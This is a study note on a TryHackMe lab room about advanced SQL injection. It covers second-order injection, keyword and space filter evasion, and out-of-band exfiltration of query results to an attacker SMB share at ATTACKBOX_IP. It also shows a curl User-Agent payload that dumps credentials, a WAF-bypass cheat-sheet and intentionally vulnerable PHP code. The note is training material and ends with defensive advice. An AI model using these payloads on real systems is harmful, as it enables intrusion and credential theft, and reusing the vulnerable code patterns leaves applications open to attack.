# Advanced SQL Injection

Advanced SQL injection techniques — second-order injection, filter evasion, out-of-band exfiltration, and HTTP-header-based injection — for cases where basic `' OR 1=1` payloads and simple keyword filters aren't enough.

> This is the **TryHackMe "Advanced SQL Injection" room** (Web Application Pentesting path, Injection Attacks module). Builds on the basics from the [SQL Injection Lab](./SQL-Injection-Lab.md) and [sqlmap](./Sqlmap.md) notes. Lab target `http://10.130.157.215/` with per-exercise subfolders (`/second/`, `/encoding/`, `/space/`, `/oob/`, `/httpagent/`).
>
> 🔗 A copy of this note also lives under `Web-Application-Pentesting/Injection-Attacks/Advanced-SQL-Injection.md` (same module placement in the WAP path).

---

**Table of contents**

- [Quick recap: the three SQLi families](#quick-recap-the-three-sqli-families)
- [Second-order SQL injection](#second-order-sql-injection)
- [Filter evasion: character encoding](#filter-evasion-character-encoding)
- [Filter evasion: no quotes, no spaces](#filter-evasion-no-quotes-no-spaces)
- [Out-of-band (OOB) SQL injection](#out-of-band-oob-sql-injection)
- [Other injection vectors](#other-injection-vectors)
- [Automation tools](#automation-tools)
- [Best practices](#best-practices)
- [In plain English](#in-plain-english)

---

## Quick recap: the three SQLi families

| Family | How it works | Pros / cons |
| --- | --- | --- |
| **In-band** (error-based / UNION-based) | Attack and data retrieval happen over the *same* channel — the response itself | Easy to exploit and detect, but noisy and easily logged |
| **Inferential / Blind** (boolean-based / time-based) | No data comes back directly; the attacker infers true/false from page behaviour or response delay | Harder to exploit (many requests needed), but works even with no visible error output |
| **Out-of-band (OOB)** | The database server makes a *separate* request (HTTP/DNS/SMB) to send data to the attacker | Stealthy and effective when direct responses are suppressed, but needs the DB to be able to reach out and needs attacker-controlled infrastructure to catch the callback |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> This room goes past those three basic families into techniques for when they're not enough on their own: injections that only fire later (second-order), filters that strip your payload before it reaches the query (evasion), and situations where no response channel exists at all (OOB).
</div>

## Second-order SQL injection

**Second-order** (a.k.a. **stored**) SQL injection: user input is saved to the database *safely* at first, then later read back out and concatenated into a *different* SQL query — where it finally breaks out. The payload causes no problem on insert, so standard input validation at the entry point never sees anything wrong.

```php
// add.php — storing a new book (safe-looking escaping, but no parameterisation)
$ssn = $conn->real_escape_string($_POST['ssn']);
$sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";
```

`real_escape_string()` only escapes quotes/meta-characters for *this* query — it does nothing to protect whatever query reads that value back out later.

```php
// update.php — reading the stored ssn back out and reusing it in a new query
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn';
                INSERT INTO logs (page) VALUES ('update.php');";
```

**Attack chain:**

1. **Insert the payload as data.** Add a book with `ssn` set to:
   ```
   12345'; UPDATE books SET book_name = 'Hacked'; --
   ```
   The INSERT succeeds normally — nothing breaks yet.
2. **Wait for the stored value to be reused.** Anyone (e.g. an admin) who later updates *any* book triggers `update.php`, which pulls that tainted `ssn` back out of the database and drops it straight into a new query.
3. **The payload fires on the second use.** The resulting query becomes:
   ```sql
   UPDATE books SET book_name = 'Testing', author = 'Hacker' WHERE ssn = '12345';
   UPDATE books SET book_name = "hacked"; --'; INSERT INTO logs (page) VALUES ('update.php');
   ```
   The `'` closes the `WHERE ssn='` clause, `;` starts a brand-new statement that updates **every** row's `book_name` to `Hacked`, and `--` comments out the rest so nothing throws a syntax error.

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> Escaping functions like <code>real_escape_string()</code> protect the query being built <em>right now</em> — they say nothing about what happens when that same stored value is read back out and reused elsewhere. The only real fix is parameterised queries/prepared statements at <strong>every</strong> point data is used in SQL, not just the point it's first entered.
</div>

## Filter evasion: character encoding

Developers often strip SQL keywords (`OR`, `AND`, `UNION`, `SELECT`) with a naive `str_replace()` — which only catches the literal, unencoded string.

```php
// search_books.php
$special_chars = array("OR", "or", "AND", "and", "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
$sql = "SELECT * FROM books WHERE book_name = '$book_name'";
```

A plain payload like `Intro to PHP' OR 1=1` gets its `OR` stripped mid-request and fails. The fix: **encode the payload so the filter never recognises it, but the database still understands it once decoded.**

| Encoding | How it works | Example |
| --- | --- | --- |
| **URL encoding** | Characters represented as `%` + hex ASCII | `' OR 1=1--` → `%27%20OR%201%3D1--` |
| **Hexadecimal** | String literal expressed as a hex constant the DBMS parses natively | `'admin'` → `0x61646d696e` |
| **Unicode** | Escape sequences for each character | `admin` → `admin` |

**Working payload** against the filtered endpoint, replacing `OR` with the `||` operator (never matched by the keyword list) and URL-encoding the quote/comment:

```
1%27%20||%201=1%20--+
```

| Piece | Meaning |
| --- | --- |
| `%27` | `'` — closes the string |
| `%20` | space |
| `\|\|` | SQL `OR` operator, spelled differently so the keyword filter misses it |
| `1=1` | always-true condition |
| `--+` | SQL comment (`--`) + `+` to keep a trailing space so the comment terminates cleanly |

Full request: `http://10.130.157.215/encoding/search_books.php?book_name=Intro%20to%20PHP%27%20||%201=1%20--+` — dumps every row despite the keyword filter, because `str_replace()` never saw `OR`, `AND`, `UNION`, or `SELECT` anywhere in the encoded payload.

## Filter evasion: no quotes, no spaces

**No-quote injection** — for filters that strip `'`/`"`:

| Technique | Example |
| --- | --- |
| Numeric values instead of quoted strings | `OR 1=1` instead of `' OR '1'='1` |
| SQL comments to drop the trailing quote | `admin--` instead of `admin'--` |
| `CONCAT()` built from hex/char codes | `CONCAT(0x61,0x64,0x6d,0x69,0x6e)` builds `"admin"` with no literal quote in the payload |

**No-space injection** — for filters that strip literal spaces (`%20`):

| Technique | Example |
| --- | --- |
| Inline comments `/**/` in place of spaces | `SELECT/**/*/**/FROM/**/users` |
| Tab/newline characters | `SELECT\t*\tFROM\tusers` |
| URL-encoded whitespace variants | `%09` (tab), `%0A` (newline), `%0C` (form feed), `%0D` (carriage return), `%A0` (non-breaking space) |

**Practical example** — the filter strips literal spaces and keywords:

```php
$special_chars = array(" ", "AND", "and", "or", "OR", "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
$sql = "SELECT * FROM user WHERE username = '$username'";
```

The URL-encoded `||`-based payload from the previous section still fails here because it contains literal spaces (`%20`). Swap those for newline encoding instead:

```
1'%0A||%0A1=1%0A--%27+
```

The SQL parser treats `%0A` the same as a space, so the query becomes `... WHERE username = '1' OR 1=1 --` once decoded — bypassing both the keyword filter and the space filter at once.

**Bypass cheat-sheet:**

| Scenario | Technique | Example |
| --- | --- | --- |
| Keywords (`SELECT`) banned | Mixed case, or split with inline comments | `SElEcT * FrOm users` / `SE/**/LECT * FROM/**/users` |
| Spaces banned | Alternate whitespace or comments | `SELECT%0A*%0AFROM%0Ausers` / `SELECT/**/*/**/FROM/**/users` |
| `AND`/`OR` banned | Symbol operators | `username='admin'&&password='x'` / `username='admin'/**/\|\|/**/1=1--` |
| `UNION`/`SELECT` banned | Hex/Unicode-encoded string literals | `SElEcT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)` |
| Any of the above banned | Build the string with concatenation functions | `CONCAT('a','d','m','i','n')` |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Info:</strong> No single bypass works everywhere — this is a hit-and-trial process. Every filter/WAF is configured slightly differently, so combining several of the above (encoding + case + comment-splitting) is often needed.
</div>

## Out-of-band (OOB) SQL injection

Used when there's **no usable response channel** — the app suppresses detailed output, a WAF blocks/logs suspicious responses, or the connection is otherwise one-way. Instead, the payload makes the *database server itself* reach out over a side channel (HTTP, DNS, SMB) to deliver the data to attacker-controlled infrastructure.

| DBMS | OOB mechanism |
| --- | --- |
| **MySQL / MariaDB** | `SELECT ... INTO OUTFILE` / `load_file()` — write query results to a file, then collect it via an SMB share or HTTP server reachable from the DB host |
| **MSSQL** | `xp_cmdshell` to run shell commands (e.g. `bcp` piping results to a UNC path), or `OPENROWSET`/`BULK INSERT` against an external source |
| **Oracle** | `UTL_HTTP` (fire an HTTP request carrying the data in the URL) or `UTL_FILE` |

Within MySQL/MariaDB specifically, exfiltration channels split by how native the support is:

| Channel | Native support | Notes |
| --- | --- | --- |
| **SMB** (`INTO OUTFILE '\\\\HOST\\share\\file'`) | Native on Windows; Linux needs `smbclient` or a mounted share | Most straightforward in this room's lab |
| **HTTP** (`http_post()`) | Not native — requires a User-Defined Function (UDF) | Complex setup, rarely available out of the box |
| **DNS** | Not native — requires a UDF or external script | Same caveat as HTTP |

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>Warning:</strong> MySQL's <code>secure_file_priv</code> setting restricts <code>INTO OUTFILE</code> to one specific directory (or blocks it entirely if empty isn't allowed on that build). Attackers have no way to read this setting directly — writing to a path is pure trial and error.
</div>

**Practical example** — set up a listener, then trigger the exfil:

```bash
# On the AttackBox: stand up an SMB share backed by /tmp
cd /opt/impacket/examples
smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp

# Confirm the share is reachable
smbclient //ATTACKBOX_IP/logs -U guest -N
```

Vulnerable endpoint: `http://10.130.157.215/oob/search_visitor.php?visitor_name=Tim` (uses `$conn->multi_query()`, which allows statement-stacking with `;`). Payload:

```
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```

| Piece | Meaning |
| --- | --- |
| `1'` | closes the original string |
| `;` | ends the first statement, starts a new one |
| `SELECT @@version INTO OUTFILE ...` | writes the DB version string to the attacker's SMB share |
| `--` | comments out anything left over |

No direct response ever confirms success — check `ls /tmp` on the listener side to see `out.txt` land.

## Other injection vectors

**HTTP header injection** — any header the app logs or queries with (User-Agent, Referer, X-Forwarded-For) is attacker-controlled input just like a form field:

```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
...
$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
```

```bash
curl -H "User-Agent: ' UNION SELECT username, password FROM user; # " http://10.130.157.215/httpagent/
```

The `'` closes the string, `UNION SELECT username, password FROM user` pulls in the credentials table, `#` comments out the rest — the response page then renders the dumped usernames/passwords inline with the normal log entries.

**Stored procedures** — dynamic SQL built *inside* a stored procedure is just as injectable as PHP string concatenation if the parameter isn't sanitised:

```sql
CREATE PROCEDURE sp_getUserData @username NVARCHAR(50)
AS BEGIN
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

**XML/JSON injection** — if parsed field values are concatenated straight into SQL without sanitisation, the injection lives inside a JSON/XML body instead of a URL/form parameter:

```json
{ "username": "admin' OR '1'='1--", "password": "password" }
```

## Automation tools

| Tool | Focus |
| --- | --- |
| **sqlmap** | General-purpose detection + exploitation across most DBMSes (see the [dedicated sqlmap notes](./Sqlmap.md)) |
| **SQLNinja** | Specialised for MSSQL backends — fingerprinting + exploitation stages |
| **JSQL Injection** | Java library/tool, targets Java-based applications |
| **BBQSQL** | Framework purpose-built for exploiting *blind* SQLi efficiently |

Automated detection is genuinely hard because: queries are built dynamically, injection points can hide in headers/URLs/body fields, defences like prepared statements/ORMs must be told apart from genuinely vulnerable queries, and context (how the input feeds into the query) varies per app — so tool output always needs manual validation.

## Best practices

**For secure coders:**

| Practice | Why |
| --- | --- |
| Parameterised queries / prepared statements | Treats input as *data*, never as part of the query structure — the only fix that fully closes SQLi, including second-order |
| Input validation & sanitisation | Reject input that doesn't match the expected type/length/format |
| Least privilege | DB account the app uses should have the minimum rights needed, limiting blast radius if injection does occur |
| Validated stored procedures | Encapsulate + validate SQL logic inside the DB, not string-concatenated |
| Regular audits/code review | Catches what automated scanners miss |

**For pentesters:**

| Practice | Why |
| --- | --- |
| Know DBMS-specific features | `xp_cmdshell` (MSSQL), `@@version` vs `version()` syntax differences, etc. |
| Use verbose errors for recon | Error-based injection leaks schema/version info for free |
| Try multiple WAF-bypass angles | Mixed case, concatenation, hex/URL encoding, inline comments |
| Fingerprint the DBMS first | Different version-string functions per engine confirm what you're dealing with |
| Think about pivoting | A compromised DB can hold credentials or trust relationships that reach further into the network |

## In plain English

- **Second-order injection** = the "sleeper agent" of SQLi: the malicious text sits harmlessly in the database until some *other* feature reads it back out and reuses it in a new query — so testing just the input form isn't enough; you have to trace where that stored value goes next.
- **Filter evasion** is a game of "the filter checks for X, so don't send X" — encode it (`%27` instead of `'`), spell it differently (`||` instead of `OR`), or hide it inside a function call (`CONCAT()`), then let the database decode/interpret it back to the original meaning after the filter has already let it through.
- **Out-of-band (OOB)** injection is for when the front door (the normal response) is locked or being watched — instead, you get the database server to mail itself (via HTTP/DNS/SMB) the data it owes you, and you collect the mail somewhere you control.
- **`secure_file_priv`** is just a MySQL setting that locks down *where* on disk a query is allowed to write a file — a safety rail, not something an attacker can read directly.
- **UDF** (User-Defined Function) = a custom function added to the database server, often needed to do things MySQL/MariaDB can't do natively (like making an HTTP request from inside a query).
- Any place user-controlled text ends up inside a SQL query string is a potential injection point — that includes HTTP headers (User-Agent) and parsed JSON/XML fields, not just obvious form inputs.
- The one fix that beats every evasion trick on this page: **parameterised queries**. Everything else (keyword blocklists, escaping, filtering) is a patch that a sufficiently creative payload can usually route around.

---

*Room: TryHackMe — "Advanced SQL Injection" (Web Application Pentesting path, Injection Attacks module). All 10 tasks covered in one pass.*
